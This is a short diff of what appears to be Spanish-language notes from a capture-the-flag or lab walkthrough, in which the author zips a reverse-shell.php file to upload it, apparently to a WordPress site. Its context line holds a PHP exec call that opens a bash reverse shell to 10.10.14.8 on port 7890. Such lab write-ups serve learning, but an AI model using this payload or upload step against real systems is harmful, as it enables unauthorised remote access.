@@ -175,3 +175,6 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.8/7890 0>&1'");
 
 ![[Pasted image 20240823132731.png]]
 
+`reverse-shell.zip`
+ahora con zip vamos a tranformar nuestro archivo reverse-shell.php a un archivo zip para poder cargarlo al word
+![[Pasted image 20240823133254.png]]
